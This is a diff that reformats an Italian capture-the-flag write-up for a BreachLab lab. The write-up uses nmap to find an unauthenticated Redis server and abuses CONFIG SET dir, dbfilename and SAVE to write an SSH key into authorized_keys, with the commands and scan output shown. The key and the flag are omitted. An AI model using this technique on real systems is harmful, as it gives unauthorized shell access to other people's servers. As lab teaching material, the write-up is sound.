@@ -1,33 +1,42 @@
-# Phantom Track - Phantom 17
+```
+ ========================================================================
+   B R E A C H L A B   ::   F I E L D   N O T E S
+ ------------------------------------------------------------------------
+   phantom track · phile 0x11 · "internal hunt"
+ ========================================================================
 
-[← Torna all'indice](../../README.md)
+   target ..: phantom-17  "Internal Hunt"
+   class ...: lateral movement · unauth Redis → SSH key write
+   tools ...: nmap · redis-cli · CONFIG SET/SAVE
+   author ..: noflyfre
+   status ..: owned
+```
 
-## Sommario
+[← indice](../../README.md)
 
-- Track: Phantom Track
-- Livello: Phantom 17 ("Internal Hunt")
-- Fonte appunti: `phantom_track/phantom17/notes.md`
+> si scansiona la /24 interna. un vicino espone Redis senza auth: e Redis
+> che scrive dove vuole sul disco significa scrivere la tua chiave in
+> `authorized_keys` e loggarti come il suo utente.
 
-## Obiettivo
+## ----[ 0x00 · intel ]----
 
-Scansionare la rete interna `10.13.37.0/24`. Uno degli host vicini espone un servizio senza autenticazione che consente di scrivere sul disco locale: l'obiettivo è abusare di quella scrittura per ottenere una shell come l'utente che gestisce il servizio, e recuperare la flag dalla sua home.
+Scansionare la rete interna `10.13.37.0/24`. Un host vicino espone un
+servizio senza autenticazione che permette di scrivere su disco:
+abusarne la scrittura per una shell come l'utente del servizio e prendere
+la flag dalla sua home.
 
-## Nota di pubblicazione
+## ----[ 0x01 · recon ]----
 
-Questa versione è pensata per GitHub e segue la dottrina BreachLab: spiega per intero la tecnica di sfruttamento di Redis non autenticato (già documentata pubblicamente, ad esempio su HackTricks), ma omette la chiave SSH pubblica specifica usata dall'operatore e qualunque valore risolutivo finale.
-
-## Ricognizione
-
-Scan iniziale dei tre target indicati nel brief, inizialmente con sintassi errata (nmap tratta gli IP separati da virgola come un unico argomento e fallisce la risoluzione). Ripetendo gli scan singolarmente si mappano i tre host:
+Scan dei target del brief (all'inizio con sintassi errata: nmap tratta gli
+IP separati da virgola come un unico argomento). Rifatti singolarmente:
 
 ```bash
 nmap -sV -p 80 10.13.37.30
 80/tcp open http BaseHTTPServer 0.6 (Python 3.10.12)
 ```
 
-Uno degli host (management) espone SSH, HTTP e una finta API "PhantomOracle" — un servizio HTTP scritto in Python che risponde con errori 404/501/400 coerenti ma non espone nulla di direttamente sfruttabile (nessun endpoint utile trovato con i metodi provati).
-
-Uno scan `-p-` completo sugli altri due host rivela la superficie reale:
+L'host management espone SSH, HTTP e una finta API "PhantomOracle" senza
+niente di sfruttabile. Uno scan `-p-` sugli altri due:
 
 ```bash
 nmap -p- 10.13.37.10 10.13.37.20
@@ -39,24 +48,32 @@ Nmap scan report for phantom-db... (10.13.37.20)
 22/tcp open  ssh
 ```
 
-Uno degli host espone Redis sulla porta standard 6379 — il servizio "senza autenticazione" indicato dal brief.
+Uno espone Redis su 6379 — il servizio "senza auth" del brief.
 
-## Tecnica
+## ----[ 0x02 · il difetto ]----
 
-Redis, se avviato senza `requirepass` e senza `protected-mode` (o esposto oltre `bind 127.0.0.1`), consente a chiunque raggiunga la porta 6379 di eseguire comandi come `SET`, `CONFIG SET dir`, `CONFIG SET dbfilename` e `SAVE`. Combinando questi comandi è possibile far scrivere a Redis un file arbitrario in una posizione arbitraria del filesystem (nei limiti dei permessi dell'utente che esegue `redis-server`).
+Redis senza `requirepass` e senza `protected-mode` (o oltre `bind
+127.0.0.1`) accetta da chiunque `SET`, `CONFIG SET dir`, `CONFIG SET
+dbfilename`, `SAVE`. Combinandoli, Redis scrive un file arbitrario in una
+posizione arbitraria (nei limiti dei permessi di `redis-server`).
 
-La tecnica nota (documentata anche nei link di riferimento del brief, incluso HackTricks) consiste nello scrivere la propria chiave pubblica SSH come valore di una chiave Redis, circondata da newline per "ripulire" il resto del file RDB generato, poi reindirizzare il salvataggio del DB in `~/.ssh/authorized_keys` dell'utente target:
+Tecnica nota (HackTricks): si scrive la propria chiave pubblica SSH come
+valore di una chiave Redis, circondata da newline per "ripulire" il resto
+del file RDB, poi si reindirizza il salvataggio in
+`~/.ssh/authorized_keys` del target:
 
-1. `SET <chiave> "\n\n<chiave-pubblica-ssh-dell'operatore>\n\n"` — scrive il contenuto della chiave pubblica come valore in memoria.
-2. `CONFIG SET dir /home/<utente>/.ssh` — reindirizza la directory di salvataggio del DB alla home SSH dell'utente target.
-3. `CONFIG SET dbfilename authorized_keys` — rinomina il file che Redis scrive.
-4. `SAVE` — forza Redis a serializzare il DB su disco, producendo un file `authorized_keys` che, nonostante il rumore binario del formato RDB attorno, resta abbastanza pulito da permettere a OpenSSH di riconoscere la riga della chiave.
+1. `SET <chiave> "\n\n<pubkey>\n\n"` — la pubkey come valore in memoria.
+2. `CONFIG SET dir /home/<utente>/.ssh` — dir di salvataggio.
+3. `CONFIG SET dbfilename authorized_keys` — nome file.
+4. `SAVE` — serializza il DB su disco; il file resta abbastanza pulito da
+   far riconoscere la riga della chiave a OpenSSH.
 
-Una volta scritta la chiave pubblica dell'operatore in `authorized_keys`, è possibile autenticarsi via SSH con la chiave privata corrispondente come l'utente proprietario del processo Redis.
+Scritta la pubkey, ci si autentica via SSH con la privata come utente del
+processo Redis.
 
-## Sfruttamento
+## ----[ 0x03 · exploit ]----
 
-1. Enumerazione dei servizi con `nmap --script redis-info` per confermare versione e configurazione:
+1. Conferma versione/config:
 
 ```bash
 nmap --script redis-info -sV -p 6379 10.13.37.10
@@ -69,15 +86,18 @@ PORT     STATE SERVICE VERSION
 |     0.0.0.0
 ```
 
-Redis 6.0.16 in ascolto su tutte le interfacce (`0.0.0.0`), senza indicazione di autenticazione richiesta: connessione diretta possibile con un semplice client Redis (`redis-cli -h <host>`).
+Redis 6.0.16 su tutte le interfacce, nessuna auth: connessione diretta con
+`redis-cli -h <host>`.
 
-2. Scrittura della propria chiave pubblica SSH come valore Redis, con newline di padding per isolarla nel file RDB risultante (valore reale della chiave omesso in questa versione pubblica):
+2. Pubkey SSH come valore Redis, con newline di padding (valore reale
+   omesso):
 
 ```text
 SET k "\n\n<PROPRIA_CHIAVE_PUBBLICA_SSH>\n\n"
 ```
 
-3. Passo successivo necessario per completare l'attacco: reindirizzare la directory e il nome del file di salvataggio verso `~/.ssh/authorized_keys` dell'utente che esegue `redis-server`, poi forzare il salvataggio:
+3. Reindirizzamento del salvataggio verso `~/.ssh/authorized_keys`
+   dell'utente Redis, poi save:
 
 ```bash
 CONFIG SET dir /home/<utente_redis>/.ssh
@@ -85,14 +105,18 @@ CONFIG SET dbfilename authorized_keys
 SAVE
 ```
 
-4. Login SSH con la propria chiave privata come utente proprietario del servizio Redis, seguito dal recupero della flag dalla sua home directory.
+4. Login SSH con la propria privata come utente del servizio Redis, poi
+   flag dalla sua home.
 
-## Risultato
+## ----[ 0x04 · loot ]----
 
-Individuata e confermata la superficie vulnerabile (Redis 6.0.16 senza autenticazione, esposto su tutte le interfacce). La tecnica di scrittura della chiave SSH via Redis è spiegata per intero sopra; nessun valore risolutivo (chiave specifica usata, utente finale, flag) viene fornito in questa versione pubblica.
+Redis 6.0.16 non autenticato su `0.0.0.0` → scrittura della pubkey in
+`authorized_keys` → login come l'utente del servizio → flag (nessun valore
+risolutivo pubblicato). Lezione: un Redis senza auth non è un database, è
+una write primitive sull'intero filesystem.
 
----
+```
+--[ eof ]---------------------------------------------------------------
 
-## Crediti
-
-Lab: BreachLab. Pubblicare sempre con credito al progetto e senza spoiler risolutivi.
+  breachlab.org · phantom track
+```
